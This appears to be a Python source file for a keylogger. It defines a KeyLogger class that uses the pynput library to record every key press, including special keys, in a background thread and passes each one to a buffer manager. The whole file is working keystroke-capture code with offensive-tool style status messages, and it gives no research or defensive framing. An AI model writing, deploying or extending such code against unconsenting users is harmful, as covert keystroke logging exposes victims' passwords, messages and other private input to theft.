from pynput import keyboard
import threading

class KeyLogger:
    def __init__(self, buffer_manager):
        self.buffer = buffer_manager
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.thread = threading.Thread(target=self.listener.start)
        self.running = False

    def start(self):
        #Start the listener thread
        self.running = True
        self.thread.start()
        print("[+] KeyLogger started in background thread.")

    def stop(self):
        #Stop listener cleanly
        self.running = False
        self.listener.stop()
        self.thread.join()
        print("[+] KeyLogger stopped")

    def on_press(self, key):
        #callback for key press events
        if not self.running:
            return

        try:
            # Handle normal alphanumeric keys
            key_str = key.char
        except AttributeError:
            # Handle special keys (space, enter, etc.)
            key_str = str(key)

        self.buffer.add_event(key_str)
